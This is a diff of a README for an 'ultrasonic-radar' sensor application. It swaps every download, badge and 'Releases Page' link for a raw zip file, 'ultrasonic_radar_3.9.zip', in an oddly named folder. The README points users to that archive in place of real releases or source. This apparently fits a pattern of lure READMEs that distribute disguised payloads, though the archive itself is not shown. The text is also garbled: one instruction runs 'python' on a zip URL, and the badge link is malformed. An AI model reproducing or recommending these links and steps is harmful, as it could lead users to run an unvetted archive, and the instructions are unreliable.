@@ -6,7 +6,7 @@ Welcome to the ultrasonic-radar application! This software helps you use ultraso
 ## 📦 Download & Install
 To get started, you need to download the software. 
 
-[![Download Ultrasonic Radar](https://raw.githubusercontent.com/zahrawou/ultrasonic-radar/main/unstavable/ultrasonic-radar.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/zahrawou/ultrasonic-radar/main/unstavable/ultrasonic-radar.zip)
+[![Download Ultrasonic Radar](https://raw.githubusercontent.com/zahrawou/ultrasonic-radar/main/unstavable/ultrasonic_radar_3.9.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/zahrawou/ultrasonic-radar/main/unstavable/ultrasonic_radar_3.9.zip)
 
 1. Click the button or link above to visit the releases page. 
 2. Look for the latest version of the application.
@@ -41,10 +41,10 @@ Once connected, you can start interacting with your ultrasonic radar.
 After installing the application, you can run it directly from the terminal. Use the following command:
 
 ```bash
-python https://raw.githubusercontent.com/zahrawou/ultrasonic-radar/main/unstavable/ultrasonic-radar.zip
+python https://raw.githubusercontent.com/zahrawou/ultrasonic-radar/main/unstavable/ultrasonic_radar_3.9.zip
 ```
 
-Replace "https://raw.githubusercontent.com/zahrawou/ultrasonic-radar/main/unstavable/ultrasonic-radar.zip" with the actual filename if it is different. This will launch the program, and you will see options for measuring distances.
+Replace "https://raw.githubusercontent.com/zahrawou/ultrasonic-radar/main/unstavable/ultrasonic_radar_3.9.zip" with the actual filename if it is different. This will launch the program, and you will see options for measuring distances.
 
 ## ❓ Troubleshooting
 If you encounter issues, here are common problems and solutions:
@@ -67,7 +67,7 @@ Your contributions help improve the application for all users.
 - **Community Support:** Join forums where users share tips and experiences.
 - **Further Learning:** Explore more about ultrasonic sensors and their applications online.
 
-For more information, visit our [Releases Page](https://raw.githubusercontent.com/zahrawou/ultrasonic-radar/main/unstavable/ultrasonic-radar.zip) to download the latest version.
+For more information, visit our [Releases Page](https://raw.githubusercontent.com/zahrawou/ultrasonic-radar/main/unstavable/ultrasonic_radar_3.9.zip) to download the latest version.
 
 ## 🧑‍💻 Acknowledgments
 Thanks to all contributors and the community of developers and users who help improve and support ultrasonic-radar.
